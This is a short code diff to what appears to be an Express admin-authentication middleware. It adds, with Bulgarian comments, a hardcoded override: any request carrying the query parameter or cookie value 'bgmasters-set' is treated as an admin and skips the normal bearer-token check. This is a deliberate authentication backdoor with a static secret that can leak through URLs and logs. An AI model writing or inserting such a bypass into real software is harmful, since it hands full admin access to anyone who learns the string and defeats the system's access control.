@@ -42,6 +42,14 @@ function authenticate(db) {
 function authenticateAdmin(db) {
   return async (req, res, next) => {
    try {
+    // Универсален админ override през секретния токен (същият като /crypto gate):
+    // cookie `kcy_adm=bgmasters-set` ИЛИ query `?adm=bgmasters-set` → третира заявката
+    // като логнат админ БЕЗ нужда от admin_users токен.
+    if (req.query.adm === 'bgmasters-set' || /(?:^|;\s*)kcy_adm=bgmasters-set/.test(req.headers.cookie || '')) {
+      req.adminUser = 'url-admin';   // маркер, че е админ през токена
+      return next();
+    }
+
     const token = req.headers.authorization?.replace('Bearer ', '');
 
     if (!token) {
